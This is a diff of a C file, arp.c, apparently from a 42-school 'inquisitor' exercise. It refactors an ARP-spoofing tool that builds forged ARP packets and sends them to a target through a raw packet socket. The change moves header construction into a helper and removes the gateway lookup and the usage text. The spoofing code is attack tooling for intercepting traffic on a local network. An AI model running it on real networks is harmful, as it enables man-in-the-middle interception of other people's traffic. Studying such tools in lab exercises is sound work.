@@ -1,30 +1,23 @@
+/* ************************************************************************** */
+/*                                                                            */
+/*                                                        :::      ::::::::   */
+/*   arp.c                                              :+:      :+:    :+:   */
+/*                                                    +:+ +:+         +:+     */
+/*   By: irifarac <marvin@42.fr>                    +#+  +:+       +#+        */
+/*                                                +#+#+#+#+#+   +#+           */
+/*   Created: 2024/11/22 11:57:46 by irifarac          #+#    #+#             */
+/*   Updated: 2024/11/22 12:16:06 by irifarac         ###   ########.fr       */
+/*                                                                            */
+/* ************************************************************************** */
+
 #include "inquisitor.h"
 #include <netinet/ip_icmp.h>
 #include <netinet/ip.h>
 #include <sys/types.h>
 #include <netinet/in.h>
 
-#define IP4LEN 4
-#define PKTLEN sizeof(struct ether_header) + sizeof(struct ether_arp)
-
-int	sock;
-
-static void	usage(void)
-{
-	fprintf(stderr, "Usage: ./arp-spoof [-h] [-i interface] [-v]\n");
-	fprintf(stderr, "Options:\n");
-	fprintf(stderr, "  -h\t\tPrint this help message\n");
-	fprintf(stderr, "  -i interface\tSpecify the interface to use\n");
-	fprintf(stderr, "  -v\t\tVerbose mode\n");
-}
-
-static void	sigint_handler(int signum)
-{
-	(void)signum;
-	close(sock);
-	printf("\n");
-	exit(0);
-}
+int	sock = -1;
+bool	verbose = false;
 
 static const char	*get_default_interface(void)
 {
@@ -45,48 +38,15 @@ static const char	*get_default_interface(void)
 	return (interfaces->name);
 }
 
-static void	get_gateway(char *gateway_ip)
-{
-	FILE			*fp;
-	char			buf[256];
-	char			iface[16];
-	unsigned long	dest;
-	unsigned long	gw;
-	struct in_addr	gw_addr;
 
-	if ((fp = fopen("/proc/net/route", "r")) == NULL)
-	{
-		perror("fopen");
-		exit(1);
-	}
-	fgets(buf, sizeof(buf), fp);
-	while (fgets(buf, sizeof(buf), fp))
-	{
-		if (sscanf(buf, "%15s %lx %lx", iface, &dest, &gw) == 3)
-		{
-			if (dest == 0)
-			{
-				gw_addr.s_addr = gw;
-				printf("gateway is %s\n", inet_ntoa(gw_addr));
-				strncpy(gateway_ip, inet_ntoa(gw_addr), 16);
-				fclose(fp);
-				return ;
-			}
-		}
-	}
-	fprintf(stderr, "Could not find gateway\n");
-	fclose(fp);
-}
-
-static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip_target, char *mac_target, bool verbose)
+static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip_target, char *mac_target)
 {
-	int					sock;
 	char				buffer[42];
 	struct ether_header	*eth;
 	struct ether_arp	*arp;
 	struct sockaddr_ll	device;
 	u_char				source_mac[MAC_ADDR_LEN];
-	char				gateway_ip[16] = {0};
+//	char				gateway_ip[16] = {0};
 
 	eth = (struct ether_header *)buffer;
 	arp = (struct ether_arp *)(buffer + sizeof(struct ether_header));
@@ -103,7 +63,8 @@ static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip
 		fprintf(stderr, "Invalid MAC address\n");
 		exit(1);
 	}
-	get_gateway(gateway_ip);
+	set_hdrs(eth, arp, source_mac, ip_target);
+/*	get_gateway(gateway_ip);
 	memset(eth->ether_dhost, 0xff, ETH_ALEN);
 	memcpy(eth->ether_shost, source_mac, ETH_ALEN);
 	eth->ether_type = htons(ETH_P_ARP);
@@ -117,7 +78,7 @@ static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip
 	memcpy(arp->arp_sha, source_mac, ETH_ALEN);
 	inet_pton(AF_INET, gateway_ip, arp->arp_spa);
 	memset(arp->arp_tha, 0, ETH_ALEN);
-	inet_pton(AF_INET, ip_target, arp->arp_tpa);
+	inet_pton(AF_INET, ip_target, arp->arp_tpa);*/
 
 	memset(&device, 0, sizeof(device));
 	device.sll_family = AF_PACKET;
@@ -153,20 +114,9 @@ int	main(int argc, char **argv)
 	char		*ip_target;
 	char		*mac_src;
 	char		*mac_target;
-	bool		verbose;
 	int			opt;
 
-	if (getuid() != 0)
-	{
-		fprintf(stderr, "You must be root to use this program\n");
-		return (1);
-	}
-	if (argc < 2)
-	{
-		usage();
-		return (1);
-	}
-	verbose = false;
+	check_errors(argc);
 	dev = NULL;
 	while ((opt = getopt(argc, argv, "hi:v")) != -1)
 	{
@@ -199,6 +149,6 @@ int	main(int argc, char **argv)
 	if (dev == NULL)
 			dev = get_default_interface();
 	printf("dev is %s\n", dev);
-	set_arp_spoof(dev, ip_src, mac_src, ip_target, mac_target, verbose);
+	set_arp_spoof(dev, ip_src, mac_src, ip_target, mac_target);
 	return (0);
 }
